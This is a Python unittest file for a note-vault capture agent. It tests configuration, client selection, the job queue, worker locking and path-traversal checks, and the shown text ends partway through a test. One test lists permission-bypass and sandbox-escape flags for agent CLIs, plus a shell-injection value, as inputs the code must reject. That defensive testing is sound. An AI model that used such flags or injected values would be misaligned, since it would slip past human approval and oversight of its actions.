"""Opt-in capture agent: durable requests, bounded launch and observable completion.

The tests use real temporary cards and job files, but no model, desktop notification,
network request or agent CLI is started. Most process/Win32 boundaries are stand-ins;
dedicated tests launch two real POSIX workers and, on Windows, check native argv/aliases.
Run from the repository root: python -m unittest discover -s tests -p v3_yakala_ajan_test.py -v
"""
import base64
import contextlib
import ctypes as C
import hashlib
import io
import json
import os
from pathlib import Path
import subprocess
import socket
import sys
import tempfile
import threading
import time
import types
import unittest
from unittest import mock
from unittest.mock import Mock, patch
import uuid


ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / 'template/.claude/scripts'
sys.path.insert(0, str(SCRIPTS))
import beyin_v3_yakala as yakala  # noqa: E402


class AgentFiles(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix='v3-yakala-ajan-')
        self.addCleanup(self.tmp.cleanup)
        # main() and enqueue resolve the vault and state (macOS /var, Windows RUNNER~1);
        # the fixture uses the same spelling, so argv and path assertions compare like with like.
        base = Path(self.tmp.name).resolve()
        self.vault = base / 'Örnek Beyin'
        self.vault.mkdir()
        self.state = base / 'state'
        self.config_path = self.state / 'yakala' / 'ajan' / 'config.json'
        local_state = patch.object(yakala, 'default_state', return_value=self.state)
        local_state.start()
        self.addCleanup(local_state.stop)
        self.downloads = base / 'İndirilenler'
        self.downloads.mkdir()
        downloads = patch.object(yakala, '_agent_downloads', return_value=str(self.downloads))
        downloads.start()
        self.addCleanup(downloads.stop)
        self.spawn = patch.object(yakala, '_agent_spawn_worker', return_value=types.SimpleNamespace(pid=1234))
        self.spawned = self.spawn.start()
        self.addCleanup(self.spawn.stop)
        toast = patch.object(yakala, '_agent_register_toast', return_value=None)
        toast.start()
        self.addCleanup(toast.stop)
        notify = patch.object(yakala, '_agent_notify', return_value=None)
        notify.start()
        self.addCleanup(notify.stop)
        # Preflight tests must not read the developer/CI host's managed policies.
        codex_config = patch.object(yakala, '_agent_codex_config_files', return_value=())
        self.codex_config_files = codex_config.start()
        self.addCleanup(codex_config.stop)
        codex_home = patch.object(yakala, '_agent_codex_home', return_value=base / 'codex-home')
        self.codex_home = codex_home.start()
        self.addCleanup(codex_home.stop)
        codex_mdm = patch.object(yakala, '_agent_codex_mdm_preflight')
        codex_mdm.start()
        self.addCleanup(codex_mdm.stop)

    def configure(self, client='claude', **values):
        values.setdefault('downloads_dir', str(self.downloads))
        path = Path(self.tmp.name) / 'agent-options.json'
        path.write_text(json.dumps(values, ensure_ascii=False), encoding='utf-8')
        return yakala.configure_agent(self.vault, self.state, client, config_file=path)

    def card(self, text='İncelenecek metin', why='ilk not', url=None):
        saved = yakala.capture(self.vault, text=text, why=why, url=url, state=self.state)
        return saved, yakala.find_card(self.vault, saved['id'], self.state)

    def queued(self, request='Bu kaynağı özetle.', delivery_id=None, **card_options):
        saved, card = self.card(**card_options)
        result = yakala.enqueue_agent(self.vault, self.state, saved['id'], request,
                                      delivery_id=delivery_id)
        job = yakala._agent_load_job(self.vault, self.state, result['job_id'])
        return result, job, card

    def window_process_identity(self, pid):
        # Popen is fake: its PID may belong to an unrelated, protected host process.
        # Only the fake child is substituted; real worker identity checks still run.
        host_identity = yakala._agent_process_identity

        def identity(candidate):
            if candidate == pid:
                return {'pid': pid, 'kind': 'windows-filetime', 'birth': '1'}
            return host_identity(candidate)

        return patch.object(yakala, '_agent_process_identity', side_effect=identity)

    def assert_codex_filesystem_policy(self, argv):
        """Check the platform contract without claiming native sandbox enforcement."""
        if yakala.os.name == 'nt':
            self.assertIn('-s', argv)
            self.assertEqual(argv[argv.index('-s') + 1], 'read-only')
            self.assertNotIn('--sandbox', argv)
            self.assertFalse(any(item.startswith(('permissions.', 'default_permissions=')) for item in argv))
            return None
        self.assertNotIn('-s', argv)
        self.assertNotIn('--sandbox', argv)
        selected = next(item for item in argv if item.startswith('default_permissions='))
        profile = json.loads(selected.split('=', 1)[1])
        self.assertRegex(profile, r'^beyin_yakala_[0-9a-f]{32}$')
        self.assertIn('permissions.' + profile + '.filesystem={":root"="deny"}', argv)
        return profile


class AgentConfigurationTest(AgentFiles):
    def test_default_is_off_and_reading_settings_does_not_create_state(self):
        self.assertFalse(self.state.exists())
        settings = yakala.agent_settings(self.vault, self.state)
        self.assertEqual(settings['client'], 'kapali')
        self.assertEqual(settings['schema'], 1)
        self.assertEqual(settings['timeout_seconds'], 900)
        self.assertEqual(settings['max_queue'], 32)
        self.assertEqual(settings['max_budget_usd'], 1.0)
        self.assertEqual(settings['extra_args'], [])
        self.assertFalse(self.state.exists())
        self.spawned.assert_not_called()

    def test_opt_in_preserves_existing_capture_settings(self):
        self.state.mkdir()
        path = self.state / yakala.STATE_FILE
        previous = {'enabled': True, 'kisayol': 'CTRL+SHIFT+B', 'inbox': yakala.DEFAULT_INBOX,
                    'future_setting': {'keep': ['this', 7]}}
        path.write_text(json.dumps(previous), encoding='utf-8')
        self.configure('claude', timeout_seconds=120, max_queue=2,
                       extra_args=['--model', 'test-model'])
        current = json.loads(path.read_text(encoding='utf-8'))
        for key, value in previous.items():
            self.assertEqual(current[key], value, key)
        settings = yakala.agent_settings(self.vault, self.state)
        self.assertEqual(settings['client'], 'claude')
        self.assertEqual(settings['timeout_seconds'], 120)
        self.assertEqual(settings['max_queue'], 2)
        self.assertEqual(settings['extra_args'], ['--model', 'test-model'])
        self.spawned.assert_not_called()

    def test_turning_off_preserves_cards_and_unrelated_configuration(self):
        self.configure('claude')
        saved, card = self.card()
        before = card['path'].read_bytes()
        yakala.configure_agent(self.vault, self.state, 'kapali')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')
        self.assertEqual(card['path'].read_bytes(), before)
        self.assertEqual(yakala.pending(self.vault, self.state), 1)

    def test_off_switch_status_and_kaldir_survive_settings_of_a_moved_vault(self):
        # A pinned state travels with a moved vault; its saved settings name the old path.
        self.configure('claude')
        config = json.loads(self.config_path.read_text(encoding='utf-8'))
        config['vault'] = str(Path(self.tmp.name) / 'Eski Konum')
        self.config_path.write_text(json.dumps(config), encoding='utf-8')
        with self.assertRaises(ValueError):
            yakala.configure_agent(self.vault, self.state, 'claude')  # turning on never adopts them
        self.assertIn('gecersiz', yakala.status(self.vault, self.state)['ajan'])  # durum reports it
        yakala.configure_agent(self.vault, self.state, 'kapali')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')
        self.config_path.write_text('{"client": ', encoding='utf-8')  # damaged by hand or by a sync tool
        self.assertEqual(yakala.uninstall(self.vault, self.state)['status'], 'kaldirildi')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')

    def test_invalid_client_does_not_modify_an_existing_configuration(self):
        self.configure()
        before = self.config_path.read_bytes()
        with self.assertRaises(ValueError):
            yakala.configure_agent(self.vault, self.state, 'shell')
        self.assertEqual(self.config_path.read_bytes(), before)

    def test_only_documented_option_pairs_are_accepted(self):
        self.configure(extra_args=['--model', 'test-model', '--effort', 'low'])
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['extra_args'],
                         ['--model', 'test-model', '--effort', 'low'])

    def test_permission_bypasses_and_shell_templates_are_rejected(self):
        dangerous = [
            {'extra_args': ['--dangerously-skip-permissions']},
            {'extra_args': ['--permission-mode', 'bypassPermissions']},
            {'extra_args': ['--dangerously-bypass-approvals-and-sandbox']},
            {'extra_args': ['--sandbox', 'danger-full-access']},
            {'extra_args': ['--allowedTools', 'Bash']},
            {'extra_args': ['--tools', 'Bash']},
            {'extra_args': ['--bare']},
            {'extra_args': '--model safe && echo side-effect'},
            {'command': 'claude -p "{request}"'},
            {'shell': True},
        ]
        for values in dangerous:
            with self.subTest(values=values), self.assertRaises(ValueError):
                self.configure(**values)
        self.assertFalse(self.config_path.exists())

    def test_bad_numeric_types_and_incomplete_option_pairs_are_rejected(self):
        invalid = [
            {'timeout_seconds': 0}, {'timeout_seconds': -1}, {'timeout_seconds': True},
            {'max_queue': 0}, {'max_queue': -1}, {'max_queue': True},
            {'max_budget_usd': -1}, {'max_budget_usd': float('nan')},
            {'extra_args': ['--model']}, {'extra_args': ['--model', '--yolo']},
            {'extra_args': [1, 2]},
        ]
        for values in invalid:
            with self.subTest(values=values), self.assertRaises(ValueError):
                self.configure(**values)

    def test_non_object_options_file_is_rejected_before_state_write(self):
        path = Path(self.tmp.name) / 'not-options.json'
        for value in ([], None, 'claude', 42):
            path.write_text(json.dumps(value), encoding='utf-8')
            with self.subTest(value=value), self.assertRaises(ValueError):
                yakala.configure_agent(self.vault, self.state, 'claude', config_file=path)
        self.assertFalse(self.config_path.exists())


class AgentAutomaticClientTest(AgentFiles):
    def setUp(self):
        super().setUp()
        environment = patch.dict(os.environ, {'CLAUDECODE': '', 'CLAUDE_CODE_ENTRYPOINT': '',
                                             'CODEX_THREAD_ID': '', 'CODEX_HOME': ''})
        environment.start()
        self.addCleanup(environment.stop)
        executable = patch.object(yakala, '_agent_executable', side_effect=FileNotFoundError)
        self.executable = executable.start()
        self.addCleanup(executable.stop)
        terminal = patch.object(sys, 'stdin', Mock(isatty=Mock(return_value=False)))
        terminal.start()
        self.addCleanup(terminal.stop)

    def cli(self, argv, terminal=False):
        output = io.StringIO()
        with patch.object(sys, 'stdout', output), patch.object(output, 'isatty', return_value=terminal):
            self.assertEqual(yakala.main(argv, vault=self.vault, state=self.state), 0)
        return output.getvalue()

    def test_session_markers_take_priority_over_installed_clients(self):
        environments = [
            ({'CLAUDECODE': '1'}, 'claude'),
            ({'CLAUDE_CODE_ENTRYPOINT': 'cli'}, 'claude'),
            ({'CODEX_THREAD_ID': str(uuid.uuid4())}, 'codex'),
            ({'CLAUDECODE': '1', 'CODEX_THREAD_ID': str(uuid.uuid4())}, 'claude'),
        ]
        for environment, client in environments:
            with self.subTest(environment=environment), patch.dict(os.environ, environment):
                self.assertEqual(yakala._agent_select_client('otomatik', True), (client, 'kurulum-ajani'))
        self.executable.assert_not_called()

    def test_location_and_empty_session_markers_are_not_session_evidence(self):
        with patch.dict(os.environ, {'CODEX_HOME': str(self.vault), 'CODEX_THREAD_ID': '',
                                     'CLAUDECODE': '0', 'CLAUDE_CODE_ENTRYPOINT': ''}):
            with self.assertRaisesRegex(ValueError, 'Ajan istemcisi bulunamadi'):
                yakala._agent_select_client('otomatik', True)
        self.assertEqual(self.executable.call_args_list, [mock.call('claude'), mock.call('codex')])

    def test_only_installed_client_is_selected_without_launching_it(self):
        for client in ('claude', 'codex'):
            with self.subTest(client=client):
                self.executable.side_effect = ([[client], FileNotFoundError()] if client == 'claude'
                                               else [FileNotFoundError(), [client]])
                self.assertEqual(yakala._agent_select_client('otomatik', True), (client, 'tek-kurulu'))

    def test_both_installed_require_a_terminal_and_non_json_output(self):
        self.executable.side_effect = None
        self.executable.return_value = ['native-cli']
        for stdin, as_json in ((None, False), (Mock(isatty=Mock(return_value=False)), False),
                               (Mock(isatty=Mock(return_value=True)), True)):
            with self.subTest(stdin=stdin, as_json=as_json), patch.object(sys, 'stdin', stdin), \
                    patch('builtins.input') as ask:
                with self.assertRaisesRegex(ValueError, '^Iki istemci de kurulu; --ajan claude veya --ajan codex sec[.]$'):
                    yakala._agent_select_client('otomatik', as_json)
                ask.assert_not_called()

    def test_both_installed_ask_for_the_client_at_a_terminal(self):
        self.executable.side_effect = None
        self.executable.return_value = ['native-cli']
        for answer, client in (('1', 'claude'), ('2', 'codex'), (' CLAUDE ', 'claude'), ('codex', 'codex')):
            with self.subTest(answer=answer), patch.object(sys.stdin, 'isatty', return_value=True), \
                    patch('builtins.input', return_value=answer) as ask:
                self.assertEqual(yakala._agent_select_client('otomatik', False), (client, 'kullanici'))
                self.assertIn('1) claude', ask.call_args.args[0])
                self.assertIn('2) codex', ask.call_args.args[0])

    def test_invalid_or_missing_answer_does_not_pick_a_client(self):
        self.executable.side_effect = None
        self.executable.return_value = ['native-cli']
        for answer in ('', '3'):
            with self.subTest(answer=answer), patch.object(sys.stdin, 'isatty', return_value=True), \
                    patch('builtins.input', return_value=answer), self.assertRaisesRegex(ValueError, 'Gecersiz secim'):
                yakala._agent_select_client('otomatik', False)
        with patch.object(sys.stdin, 'isatty', return_value=True), patch('builtins.input', side_effect=EOFError), \
                self.assertRaisesRegex(ValueError, 'Istemci secilemedi'):
            yakala._agent_select_client('otomatik', False)

    def test_neither_installed_fails_before_install_or_config_write(self):
        with patch.object(yakala, 'install') as install, self.assertRaisesRegex(ValueError, 'Ajan istemcisi bulunamadi'):
            self.cli(['kur', '--ajan', 'otomatik'])
        install.assert_not_called()
        self.assertFalse(self.config_path.exists())

    def test_ambiguous_cli_json_output_preserves_existing_configuration(self):
        self.configure('claude')
        before = self.config_path.read_bytes()
        self.executable.side_effect = None
        self.executable.return_value = ['native-cli']
        for argv in (['kur', '--ajan', 'otomatik', '--json'], ['ajan', 'otomatik', '--json']):
            with self.subTest(argv=argv), patch.object(yakala, 'install') as install, \
                    patch.object(sys.stdin, 'isatty', return_value=True), patch('builtins.input') as ask, \
                    self.assertRaisesRegex(ValueError, 'Iki istemci de kurulu'):
                self.cli(argv, terminal=True)
            install.assert_not_called()
            ask.assert_not_called()
            self.assertEqual(self.config_path.read_bytes(), before)

    def test_automatic_agent_command_saves_only_the_concrete_client(self):
        self.executable.side_effect = [FileNotFoundError(), ['codex']]
        result = json.loads(self.cli(['ajan', 'otomatik', '--ag', 'acik', '--gorunum', 'gizli']))
        self.assertEqual(result['ajan'], 'codex')
        self.assertEqual(result['secim'], 'tek-kurulu')
        config = json.loads(self.config_path.read_text(encoding='utf-8'))
        self.assertEqual(config['client'], 'codex')
        self.assertEqual(config['ag'], 'acik')
        self.assertEqual(config['gorunum'], 'gizli')
        self.assertNotIn('otomatik', config.values())
        self.assertNotIn('secim', config)

    def test_setup_view_prompt_uses_the_resolved_client(self):
        with patch.dict(os.environ, {'CLAUDECODE': '1'}), \
                patch.object(yakala, 'install', return_value={'status': 'kuruldu'}) as install, \
                patch.object(yakala, '_agent_window_supported', return_value=True), \
                patch.object(sys.stdin, 'isatty', return_value=True), \
                patch('builtins.input', return_value='2') as ask:
            result = json.loads(self.cli(['kur', '--ajan', 'otomatik']))
            # JSON output suppresses the view question as before.
            ask.assert_not_called()
            self.assertEqual(result['ajan']['gorunum'], 'gizli')
            install.return_value = {'status': 'kuruldu', 'web_clipper_sablonu': 'clipper.json'}
            output = self.cli(['kur', '--ajan', 'otomatik'], terminal=True)
            ask.assert_called_once()
            self.assertIn('nasil calissin', ask.call_args.args[0])
        self.assertIn('Arka plan ajani: claude', output)
        self.assertIn('Ajan secimi: kurulum-ajani', output)
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['gorunum'], 'pencere')
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'claude')

    def test_setup_terminal_client_answer_is_saved_and_then_view_is_asked(self):
        self.executable.side_effect = None
        self.executable.return_value = ['native-cli']
        with patch.object(yakala, 'install', return_value={'web_clipper_sablonu': 'clipper.json'}), \
                patch.object(yakala, '_agent_window_supported', return_value=True), \
                patch.object(sys.stdin, 'isatty', return_value=True), \
                patch('builtins.input', side_effect=['1', '2']) as ask:
            output = self.cli(['kur', '--ajan', 'otomatik'], terminal=True)
        self.assertEqual(ask.call_count, 2)
        self.assertIn('hangi istemciyi', ask.call_args_list[0].args[0])
        self.assertIn('nasil calissin', ask.call_args_list[1].args[0])
        self.assertIn('Ajan secimi: kullanici', output)
        config = json.loads(self.config_path.read_text(encoding='utf-8'))
        self.assertEqual(config['client'], 'claude')
        self.assertEqual(config['gorunum'], 'pencere')

    def test_setup_explicit_view_skips_the_prompt_for_both_clients(self):
        # Both clients now offer the window view; an explicit --ajan-gorunum still skips the question.
        for client, options in (('codex', ['--ajan-gorunum', 'gizli']), ('claude', ['--ajan-gorunum', 'gizli'])):
            environment = {'CODEX_THREAD_ID': 'test-thread'} if client == 'codex' else {'CLAUDECODE': '1'}
            with self.subTest(client=client), patch.dict(os.environ, environment), \
                    patch.object(yakala, 'install', return_value={'web_clipper_sablonu': 'clipper.json'}), \
                    patch.object(yakala, '_agent_window_supported', return_value=True), \
                    patch.object(sys.stdin, 'isatty', return_value=True), patch('builtins.input') as ask:
                self.cli(['kur', '--ajan', 'otomatik'] + options, terminal=True)
                ask.assert_not_called()
                self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], client)

    def test_explicit_clients_keep_existing_behavior(self):
        with patch('builtins.input') as ask:
            for client in ('claude', 'codex', 'kapali'):
                self.assertEqual(yakala._agent_select_client(client, False), (client, None))
                result = json.loads(self.cli(['ajan', client]))
                self.assertEqual(result['ajan'], client)
                self.assertNotIn('secim', result)
            self.executable.assert_not_called()
            ask.assert_not_called()
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')
        self.spawned.assert_not_called()

    def test_setup_without_agent_stays_off_even_in_an_agent_session(self):
        with patch.dict(os.environ, {'CLAUDECODE': '1'}), \
                patch.object(sys.stdin, 'isatty', return_value=True), \
                patch.object(yakala, 'install', return_value={'web_clipper_sablonu': 'clipper.json'}), \
                patch.object(yakala, '_agent_select_client') as select, patch('builtins.input') as ask:
            self.cli(['kur'], terminal=True)
        select.assert_not_called()
        ask.assert_not_called()
        self.executable.assert_not_called()
        self.assertFalse(self.config_path.exists())
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')
        self.spawned.assert_not_called()


class AgentQueueTest(AgentFiles):
    def test_plain_capture_never_starts_an_agent_even_when_feature_is_on(self):
        self.configure()
        saved, card = self.card()
        self.assertEqual(card['meta']['durum'], 'bekliyor')
        self.assertEqual(yakala.pending(self.vault, self.state), 1)
        self.spawned.assert_not_called()

    def test_disabled_feature_refuses_delivery_but_keeps_saved_card(self):
        saved, card = self.card()
        before = card['path'].read_bytes()
        with self.assertRaises(ValueError):
            yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Özetle.')
        self.assertEqual(card['path'].read_bytes(), before)
        self.spawned.assert_not_called()

    def test_empty_request_refuses_delivery_but_keeps_saved_card(self):
        self.configure()
        saved, card = self.card()
        before = card['path'].read_bytes()
        for text in ('', ' ', '\r\n\t'):
            with self.subTest(text=text), self.assertRaises(ValueError):
                yakala.enqueue_agent(self.vault, self.state, saved['id'], text)
        self.assertEqual(card['path'].read_bytes(), before)
        self.spawned.assert_not_called()

    def test_request_is_durable_before_worker_is_spawned(self):
        self.configure()
        saved, card = self.card()
        observed = []

        def inspect(vault, state):
            updated = yakala.find_card(vault, saved['id'], state)
            observed.append(updated['meta']['durum'])
            return types.SimpleNamespace(pid=22)

        self.spawned.side_effect = inspect
        result = yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Kaynağı kısa özetle.')
        self.assertEqual(result['status'], 'ajanda')
        self.assertEqual(observed, ['ajanda'])
        uuid.UUID(result['job_id'])
        job = yakala._agent_load_job(self.vault, self.state, result['job_id'])
        self.assertEqual(job['request'], 'Kaynağı kısa özetle.')
        self.assertEqual(yakala.find_card(self.vault, saved['id'], self.state)['meta']['durum'], 'ajanda')

    def test_repeated_delivery_reuses_job_and_session_identity(self):
        self.configure()
        delivery = uuid.uuid4().hex
        result, job, card = self.queued(delivery_id=delivery)
        again = yakala.enqueue_agent(self.vault, self.state, card['id'], job['request'], delivery_id=delivery)
        self.assertEqual(again['job_id'], result['job_id'])
        self.assertEqual(again['session_id'], result['session_id'])
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, result['job_id'])['request'], job['request'])

    def test_repeated_delivery_wakes_a_durably_queued_job_after_sender_crash(self):
        self.configure()
        result, job, card = self.queued(delivery_id=uuid.uuid4().hex)
        # No worker was actually launched by the fixture: this is the persisted
        # state left by a sender dying between commit and its wake-up Popen.
        self.spawned.reset_mock()
        repeated = yakala.enqueue_agent(self.vault, self.state, card['id'], job['request'],
                                        delivery_id=job['delivery_id'])
        self.spawned.assert_called_once_with(self.vault, self.state)
        self.assertEqual(repeated['job_id'], result['job_id'])
        self.assertEqual(len(yakala._agent_jobs(self.vault, self.state)), 1)

    def test_repeated_delivery_wakeup_failure_keeps_the_existing_job_queued(self):
        self.configure()
        result, job, card = self.queued(delivery_id=uuid.uuid4().hex)
        self.spawned.side_effect = OSError('wake-up failed')
        repeated = yakala.enqueue_agent(self.vault, self.state, card['id'], job['request'],
                                        delivery_id=job['delivery_id'])
        self.assertEqual(repeated['status'], 'ajan_baslatilamadi')
        self.assertEqual(repeated['job_id'], result['job_id'])
        self.assertEqual(yakala._agent_load_job(self.vault, self.state, job['id'])['state'], 'queued')

    def test_corrupted_sort_key_cannot_stop_an_unrelated_queued_job(self):
        self.configure()
        _, damaged, _ = self.queued(text='Damaged queue record')
        _, healthy, _ = self.queued(text='Healthy independent queue record')
        damaged['created_ns'] = 'bad timestamp'
        target = yakala._agent_job_dir(self.vault, self.state, damaged['id']) / 'job.json'
        yakala._agent_json(target, damaged)
        before = target.read_bytes()

        def finish(vault, state, job):
            yakala._agent_end(vault, state, job, 'approval_required', 'Test worker stopped safely.')

        with patch.object(yakala, '_agent_run_job', side_effect=finish) as run:
            self.assertEqual(yakala._agent_worker(self.vault, self.state), 0)
        self.assertEqual([call.args[2]['id'] for call in run.call_args_list], [healthy['id']])
        self.assertEqual(target.read_bytes(), before)
        self.assertIn('Is kaydi okunamadi', (yakala._agent_root(self.state) / 'worker.log').read_text(encoding='utf-8'))

    def test_old_config_and_job_ignore_missing_last_session_and_still_start(self):
        self.configure()
        legacy = dict(yakala._agent_defaults(self.vault), client='claude',
                      last_session_path='missing/Last-Session.md')
        yakala._agent_json(self.config_path, legacy)
        self.assertNotIn('last_session_path', yakala.agent_settings(self.vault, self.state))
        _, job, card = self.queued()
        job['config'] = legacy
        job['last_session'] = 'missing/Last-Session.md'
        job['state'] = 'running'
        yakala._agent_json(yakala._agent_job_dir(self.vault, self.state, job['id']) / 'job.json', job)

        loaded = yakala._agent_load_job(self.vault, self.state, job['id'])
        self.assertEqual(loaded['last_session'], 'missing/Last-Session.md')
        self.assertNotIn('last_session_path', loaded['config'])
        self.assertEqual([item['id'] for item in yakala._agent_jobs(self.vault, self.state)], [job['id']])
        with patch.object(yakala, '_agent_executable', side_effect=ValueError('Test launch boundary')) as launch:
            yakala._agent_run_job(self.vault, self.state, loaded)
        launch.assert_called_once()  # The missing legacy path no longer blocks startup.
        saved = yakala._agent_load_job(self.vault, self.state, job['id'])
        self.assertEqual(saved['state'], 'approval_required')
        self.assertEqual(yakala.find_card(self.vault, card['id'], self.state)['meta']['durum'], 'onay-bekliyor')
        self.assertEqual([item['id'] for item in yakala._agent_jobs(self.vault, self.state)], [job['id']])
        settings = yakala._agent_validate_settings(dict(saved['config'], last_session_path='../outside.md'),
                                                   self.vault)
        self.assertNotIn('last_session_path', settings)  # Ignored, never a write target.

    def test_missing_reconciliation_summary_cannot_stop_an_unrelated_queued_job(self):
        self.configure()
        _, damaged, _ = self.queued(text='Damaged terminal reconciliation')
        _, healthy, _ = self.queued(text='Healthy request after damaged reconciliation')
        damaged.update(state='failed', card_reconcile=True)
        damaged.pop('result_summary', None)
        target = yakala._agent_job_dir(self.vault, self.state, damaged['id']) / 'job.json'
        yakala._agent_json(target, damaged)
        before = target.read_bytes()

        def finish(vault, state, job):
            yakala._agent_end(vault, state, job, 'approval_required', 'Test worker stopped safely.')

        with patch.object(yakala, '_agent_run_job', side_effect=finish) as run:
            self.assertEqual(yakala._agent_worker(self.vault, self.state), 0)
        self.assertEqual([call.args[2]['id'] for call in run.call_args_list], [healthy['id']])
        self.assertEqual(target.read_bytes(), before)
        self.assertIn('Is kaydi okunamadi', (yakala._agent_root(self.state) / 'worker.log').read_text(encoding='utf-8'))

    @unittest.skipIf(os.name == 'nt', 'This exercises POSIX flock with real workers; Win32 needs its native gate.')
    def test_two_real_workers_run_each_job_once_without_overlapping(self):
        self.configure()
        _, first, _ = self.queued(text='First real worker test')
        _, second, _ = self.queued(text='Second real worker test')
        trace = Path(self.tmp.name) / 'worker-trace.txt'
        active = Path(self.tmp.name) / 'worker-active'
        script = '''import os, sys, time
from pathlib import Path
sys.path.insert(0, sys.argv[1])
import beyin_v3_yakala as y
vault, state, trace, active = map(Path, sys.argv[2:])
y._agent_notify = lambda *args, **kwargs: None
def run(vault, state, job):
    fd = os.open(active, os.O_CREAT | os.O_EXCL | os.O_WRONLY, 0o600)
    os.close(fd)
    try:
        with trace.open('a', encoding='utf-8') as out:
            out.write(job['id'] + '\\n')
            out.flush()
        time.sleep(0.15)
        y._agent_end(vault, state, job, 'approval_required', 'Real worker lock test')
    finally:
        active.unlink()
y._agent_run_job = run
sys.exit(y._agent_worker(vault, state))
'''
        command = [sys.executable, '-c', script, str(SCRIPTS), str(self.vault), str(self.state), str(trace), str(active)]
        workers = [subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE) for _ in range(2)]
        try:
            for worker in workers:
                output, error = worker.communicate(timeout=15)
                self.assertEqual(worker.returncode, 0, (output + error).decode('utf-8', 'replace'))
        finally:
            for worker in workers:
                if worker.poll() is None:
                    worker.kill()
                    worker.wait(timeout=5)
        self.assertCountEqual(trace.read_text(encoding='utf-8').splitlines(), [first['id'], second['id']])
        self.assertFalse(active.exists())

    def test_recaptured_url_uses_the_current_request_not_the_first_neden_section(self):
        self.configure()
        saved, original = self.card(url='https://example.com/source', why='Bu eski istek.')
        same = yakala.capture(self.vault, url='https://example.com/source', why='Bu yeni istek.', state=self.state)
        self.assertEqual(same['id'], saved['id'])
        self.assertEqual(yakala._section(yakala.find_card(self.vault, same['id'], self.state)['body'], 'Neden'),
                         'Bu eski istek.')
        result = yakala.enqueue_agent(self.vault, self.state, same['id'], 'Bu yeni istek.')
        job = yakala._agent_load_job(self.vault, self.state, result['job_id'])
        self.assertEqual(job['request'], 'Bu yeni istek.')

    def test_queue_limit_keeps_the_next_capture_pending(self):
        self.configure(max_queue=1)
        self.queued(text='Birinci kaynak')
        saved, card = self.card(text='İkinci kaynak')
        before = card['path'].read_bytes()
        with self.assertRaises(ValueError):
            yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Bunu da özetle.')
        self.assertEqual(card['path'].read_bytes(), before)
        self.assertEqual(yakala.find_card(self.vault, saved['id'], self.state)['meta']['durum'], 'bekliyor')

    def test_missing_card_does_not_create_a_job_or_start_worker(self):
        self.configure()
        with self.assertRaises(ValueError):
            yakala.enqueue_agent(self.vault, self.state, '../olmayan', 'Özetle.')
        self.spawned.assert_not_called()

    def test_worker_spawn_failure_never_loses_or_marks_the_card_complete(self):
        self.configure()
        saved, card = self.card(why='Ayrı süreç başlatılamasa da bu not kalsın.')
        self.spawned.side_effect = OSError('simulated breakaway refusal')
        try:
            yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Özetle.')
        except (OSError, ValueError):
            pass
        kept = yakala.find_card(self.vault, saved['id'], self.state)
        self.assertIn('Ayrı süreç başlatılamasa da bu not kalsın.', kept['body'])
        self.assertNotEqual(kept['meta']['durum'], 'islendi')
        self.spawned.assert_called_once()

    def test_job_path_rejects_non_uuid_traversal(self):
        for value in ('../outside', '../../outside', '', '/tmp/outside', '..\\outside'):
            with self.subTest(value=value), self.assertRaises(ValueError):
                yakala._agent_job_dir(self.vault, self.state, value)


class AgentLinkedRootTest(unittest.TestCase):
    """A link ABOVE the vault, state or Downloads folder is the user's choice (macOS /var ->
    /private/var, Windows RUNNER~1, a vault kept under a linked folder); a link BELOW is refused."""

    def setUp(self):
        temporary = tempfile.TemporaryDirectory(prefix='yakala-agent-linked-')
        self.addCleanup(temporary.cleanup)
        real = Path(temporary.name) / 'gercek klasor'
        real.mkdir()
        self.linked = Path(temporary.name) / 'bagli klasor'
        try:
            os.symlink(real, self.linked, target_is_directory=True)
        except (OSError, NotImplementedError):
            self.skipTest('symlinks are not available to this account')
        self.vault, self.state, self.downloads = self.linked / 'Örnek Beyin', self.linked / 'state', self.linked / 'İndirilenler'
        self.vault.mkdir()
        self.downloads.mkdir()
        self.outside = Path(temporary.name) / 'disari'
        self.outside.mkdir()
        for name, value in (('default_state', self.state), ('_agent_downloads', str(self.downloads)),
                            ('_agent_spawn_worker', None), ('_agent_register_toast', None), ('_agent_notify', None)):
            mocked = patch.object(yakala, name, return_value=value)
            mocked.start()
            self.addCleanup(mocked.stop)

    def test_linked_prefix_above_vault_state_and_downloads_is_accepted(self):
        self.assertEqual(yakala.agent_settings(self.vault, self.state)['client'], 'kapali')
        yakala.configure_agent(self.vault, self.state, 'claude', network='acik')  # a direct file URL the page did not link
        saved = yakala.capture(self.vault, url='https://example.com/music', why='Find the music', state=self.state)
        # `beyin.py yakala ajan-devam` passes the state exactly as resolve_state() spelled it.
        queued = yakala.enqueue_agent(self.vault, self.state, saved['id'], 'Find the music')
        job = yakala._agent_load_job(self.vault, self.state, queued['job_id'])
        job['state'] = 'running'
        yakala._agent_prepare_runtime(self.vault, self.state, job)
        body = b'ID3\x04\0\0\0\0\0\0a test track'

        def fetch(url, byte_limit, output):
            output.write(body)
            return {'url': url, 'body': None, 'bytes': len(body), 'content_type': 'audio/mpeg',
                    'sha256': hashlib.sha256(body).hexdigest()}
        with patch.object(yakala, '_agent_public_get', side_effect=fetch):
            download = yakala._agent_tool_call(self.vault, self.state, job['id'], 'download',
                                              {'url': 'https://example.com/a.mp3', 'filename': 'song.mp3'})
        note = yakala._agent_tool_call(self.vault, self.state, job['id'], 'write_note',
                                      {'title': 'Result', 'content': 'Verified result'})
        yakala._agent_tool_call(self.vault, self.state, job['id'], 'complete',
                               {'status': 'completed', 'summary': 'Saved.', 'notes': [note['path']], 'downloads': [download]})
        manifest = json.loads((yakala._agent_job_dir(self.vault, self.state, job['id']) / 'result.json').read_text(encoding='utf-8'))
